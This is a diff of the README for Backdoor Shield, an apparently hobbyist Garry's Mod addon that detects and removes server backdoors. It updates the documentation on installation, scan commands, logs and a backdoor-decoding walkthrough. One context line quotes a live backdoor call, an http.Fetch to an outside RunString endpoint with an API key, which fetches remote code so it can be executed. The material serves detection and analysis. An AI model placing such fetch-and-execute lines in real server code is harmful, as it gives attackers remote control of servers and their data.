@@ -2,68 +2,123 @@
 
 Protect your GMod server against backdoors! Block, find, investigate and remove them.
 
-![image](https://user-images.githubusercontent.com/5098527/165896813-85405615-4c63-468f-89d5-3aa7ead002ba.png)
-
-## !! WARNING !!
-
->DO-NOT-USE this addon on servers with paid mods!!!! Many of them have complex DRMs, which in most cases get detected and blocked. This can lead to serious authentication problems and even license loss! If you suspect that your addons are infected, run them along Backdoor Shield in a clean server/GMod instance!
->
->Also, consider that this addon just gives you an extra layer of security! You'll be able to scan your files and avoid a series of unwanted executions with a basic real-time protection, but don't think that it'll get you out of all troubles!
+![image](https://user-images.githubusercontent.com/5098527/167985260-d2e325c7-b310-4eee-a246-ecde898fd5d2.png)
 
 <br/>
 
-## Install
+# Incompatibilities
+
+> DO-NOT-USE this addon on servers with paid mods!!!! Many of them have complex DRMs, which in most cases get detected and blocked. This can lead to serious authentication problems and even license loss! If you suspect that your addons are infected, run them along Backdoor Shield in a clean server/GMod instance!
+
+> Avoid addons that set their own environment because they can break, like:
+> - gmDoom - https://steamcommunity.com/sharedfiles/filedetails/?id=133300986
+
+> Also, consider Backdoor Shield as W.I.P. and know that I don't intend to make this addon user friendly or exaggerate its features, this project is a hobbyist experiment.
+
+<br/>
+
+
+# What is a backdoor?
+
+    "a backdoor refers to any method by which authorized and unauthorized users are able to get around normal security measures and gain high level user access (aka root access) on a computer system, network, or software application. Once they're in, cybercriminals can use a backdoor to steal personal and financial data, install additional malware, and hijack devices."
+    --- Malwarebytes
+
+As for backdoors, in GMod very often we confront entire groups with pre-made panels using complex functions, there's a market for that.
+
+Although the security of the game has increased a lot over time, these attacks are still very dangerous as they can culminate in theft of scripts, settings and personal data as well as other types of damage. E.g. someone with improper admin access can either delete all files in the data folder or slowly cause server issues until the players give up on it.
+
+<br/>
+
+
+# Install
 
 Clone or download the files inside your **addons folder**.
 
-Or via workshop: https://steamcommunity.com/sharedfiles/filedetails/?id=2215013575
+You can also subscribe to BS in the Workshop, but that way you won't be able to change the addon settings later: https://steamcommunity.com/sharedfiles/filedetails/?id=2215013575
 
 <br/>
 
-## Configure
+# Configure
 
-- Addon settings: **lua/bs/init.lua**
-- Scan definitions: **lua/bs/server/definitions.lua**
+All settings are in three files in this folder:
+- **lua/bs/server/definitions/**
+
+There's one for the file scanner, one for real-time protection, and one for internal behaviour. Everything is documented at each location.
 
 <br/>
 
-## Commands
+# Commands
 
-    #
-    |-> bs_tests                Run a series of tests when BS.devMode is
-    |                           set to true.
+As shown in the screenshot above:
+
+    Commands:
     |
-    |-> bs_scan FOLDER(S)       Recursively scan all files in FOLDER(S).
+    |-> bs_scan FOLDER(S)       Recursively scan lua, txt, vmt, dat and
+    |                           json files in FOLDER(S).
     |
-    |-> bs_scan_fast FOLDER(S)  Recursively scan lua, txt, vmt, dat and
-                                json files in FOLDER(S).
+    |-> bs_scan_full FOLDER(S)  Recursively scan all files in FOLDER(S).
+       
+        * If no folder is defined, it'll scan addons, lua, gamemodes and
+          data folders.
 
-        * If no folder is defined, it'll scan addons, lua, gamemode and
-        data folders.
+It is worth noting that it's a good idea to focus searches to obtain relevant and reduced results. Multiple folders can be selected by the commands, like:
+
+    bs_scan_full addons/myAddonA addons/myAddonB
+
+And an interesting thing to do here is to isolate suspicious files in subfolders within the addons folder (like addons/isolation/suspiciousAddon). That way, the game will mount all the content but it'll not execute. Now we can run the command:
+
+    bs_scan_full addons/isolation/suspiciousAddon
+
+
+Note: there's also the ``bs_tests`` command to aid in development. It's enabled when dev mode is turned on.
 
 <br/>
 
-## Scan Logs
+# Logs
 
-Each scan log is stored in **data/backdoor-shield**. They divide the results into risk groups that are displayed together during the detection or by order in the saved file.
+They're stored in **data/backdoor-shield**.
 
-<details><summary>Console</summary>
+![image](https://user-images.githubusercontent.com/5098527/167988691-5b611163-0a22-41fc-8011-c38e083c0516.png)
+
+<details><summary>File scanner</summary>
 <p>
-<img src="https://i.imgur.com/sBzfD9G.png"/>
+<img src="https://user-images.githubusercontent.com/5098527/167990351-941bd7ef-abc0-4e6a-8600-48e097ca3fde.png"/>
+
+Logs from the file scanner are are organized by date and time. Within them, the information is grouped by risk.
+
+<img src="https://user-images.githubusercontent.com/5098527/167990714-480bb9f3-30df-44f7-bcca-216f14e6c957.png"/>
 </p>
 </details>
 
-<details><summary>File</summary>
+<details><summary>Real-time</summary>
 <p>
-<img src="https://i.imgur.com/kwUtAb0.png"/>
+<img src="https://user-images.githubusercontent.com/5098527/167990081-4d8a0a56-6235-43bd-b08d-da32c3bfd6e4.png"/>
+
+As for the real-time detections, they are in subfolders named by date and are organized in two different ways.
+
+<img src="https://user-images.githubusercontent.com/5098527/167988995-2b2443dc-037f-47c8-91f0-597504ea04ba.png"/>
+
+In the first one, items are grouped by "detections", "warnings" and "detours", as shown above. Within these files the entries are placed in order of occurrence:
+
+<img src="https://user-images.githubusercontent.com/5098527/167989406-cdac9556-a728-424f-9f58-d1198f04cde9.png"/>
+
+In the second, each detection is placed inside subfolders with the name of the detected function and relevant items such as pieces of malicious code.
+
+<img src="https://user-images.githubusercontent.com/5098527/167989468-366ef03a-b663-42cb-907b-8cafb25c8e4c.png"/>
+
+<img src="https://user-images.githubusercontent.com/5098527/167989517-e422463d-d7e1-4293-99a6-724169fa8fba.png"/>
 </p>
 </details>
 
 <br/>
 
-## Detection Logs
+# Real-time protection example
 
-The real time protection prints console messages and creates detection logs in the folder **data/backdoor-shield/THE-CURRENT-DATE**. Results are stored in files that display all together, but are also stored separately by folder and type when detected contents are available.
+The example below was made in an older version of the addon but it's ok, the idea is still very similar to the current one.
+
+<br/>
+
+## Detection
 
 <details><summary>1) Running two backdoors</summary>
 <p>
@@ -81,7 +136,7 @@ http.Fetch("https://steamcommunity.omega-project.cz/lua_run/RunString.php?apikey
 </p>
 </details>
 
-<details><summary>2) Real time protection</summary>
+<details><summary>2) The detection occurs</summary>
 <p>
 <img src="https://i.imgur.com/BDk6TJk.png"/>
 <img src="https://i.imgur.com/3yWXO6D.png"/>
@@ -281,11 +336,11 @@ end)
 
 <br/>
 
-## Backdoor Hunting
+## Decoding
 
-Actually you can copy the detection results, decode them and keep going to see whats going on.
+We can keep going to see whats going on. I won't explain how I deobfuscated the code but I'll show the result.
 
-<details><summary>1) Here is the decoding of the active backdoor from the examples above</summary>
+<details><summary>1) Here is the active backdoor decoded</summary>
 <p>
 
 It's inhibiting other backdoors through some detourings and taking the next step.
@@ -416,7 +471,7 @@ end)
 </p>
 </details>
 
-<details><summary>3) Now I got a bunch of things to analyze</summary>
+<details><summary>3) Now I got a new detection with a bunch of new things to analyze</summary>
 <p>
 <img src="https://i.imgur.com/SBwHXDy.png"/>
 
@@ -700,7 +755,7 @@ end
 </p>
 </details>
 
-<details><summary>4) After more decoding, I can see everything</summary>
+<details><summary>4) After more work, I can see everything</summary>
 <p>
 
 ```lua
